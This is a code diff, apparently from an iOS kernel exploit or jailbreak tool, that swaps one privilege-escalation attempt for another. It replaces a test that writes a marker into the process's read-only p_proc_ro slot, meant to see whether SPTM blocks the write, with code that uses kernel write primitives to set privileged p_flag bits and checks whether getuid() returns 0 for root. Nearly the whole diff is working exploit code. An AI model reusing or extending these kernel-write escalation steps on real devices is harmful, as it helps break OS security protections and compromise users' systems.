@@ -756,26 +756,25 @@
                     kwrite_zone_element_qword(proc, listNext, proc, 0x400);
                     [r appendString:@"  restored p_list.next\n"];
 
-                    // ---- p_proc_ro swap attempt ----
-                    extern uint32_t off_proc_p_proc_ro;
-                    uint64_t procRoSlot = proc + off_proc_p_proc_ro;
-                    uint64_t origProcRo = early_kread64(procRoSlot);
-                    [r appendFormat:@"  p_proc_ro = 0x%016llx (slot=0x%016llx)\n", origProcRo, procRoSlot];
-                    // Test: write a marker to p_proc_ro slot and see if it persists
-                    uint64_t testProcRo = 0xCCCCDDDDEEEEFFFFULL;
-                    krw_zone_verdict sv = kwrite_zone_element_qword(procRoSlot, testProcRo, proc, 0x400);
-                    uint64_t swapRB = early_kread64(procRoSlot);
-                    [r appendFormat:@"  p_proc_ro write: verdict=%d  readback=0x%016llx (expect 0x%016llx)\n",
-                        (int)sv, swapRB, testProcRo];
-                    if (swapRB == testProcRo) {
-                        [r appendString:@"  >>> P_PROC_RO SLOT WRITABLE! SPTM did not block!\n"];
-                        [r appendString:@"  >>> restoring original p_proc_ro\n"];
-                        kwrite_zone_element_qword(procRoSlot, origProcRo, proc, 0x400);
-                        [r appendFormat:@"  getuid() after restore: %d\n", getuid()];
-                    } else {
-                        [r appendString:@"  >>> p_proc_ro write did not persist (SPTM or RO)\n"];
-                        kwrite_zone_element_qword(procRoSlot, origProcRo, proc, 0x400);
+                    // ---- try p_flag for root ----
+                    extern uint32_t off_proc_p_flag;
+                    uint64_t flagSlot = proc + off_proc_p_flag;
+                    uint64_t origFlag = early_kread64(flagSlot);
+                    [r appendFormat:@"  p_flag = 0x%016llx (slot=0x%016llx)\n", origFlag, flagSlot];
+                    // Set P_SUGID (0x00000400) and other privileged flags
+                    uint64_t newFlag = origFlag | 0x00000400 | 0x00000800 | 0x00000020;
+                    krw_zone_verdict fv = kwrite_zone_element_qword(flagSlot, newFlag, proc, 0x400);
+                    uint64_t flagRB = early_kread64(flagSlot);
+                    [r appendFormat:@"  p_flag write: verdict=%d  readback=0x%016llx\n", (int)fv, flagRB];
+                    if (flagRB == newFlag) {
+                        [r appendFormat:@"  >>> P_FLAG WRITTEN! getuid() now: %d\n", getuid()];
+                        if (getuid() == 0) {
+                            [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
+                        }
                     }
+                    // Restore flag
+                    kwrite_zone_element_qword(flagSlot, origFlag, proc, 0x400);
+                    [r appendFormat:@"  getuid() after restore: %d\n", getuid()];
                 } else {
                     [r appendString:@"  >>> proc write did not persist\n"];
                     kwrite_zone_element_qword(proc, listNext, proc, 0x400);
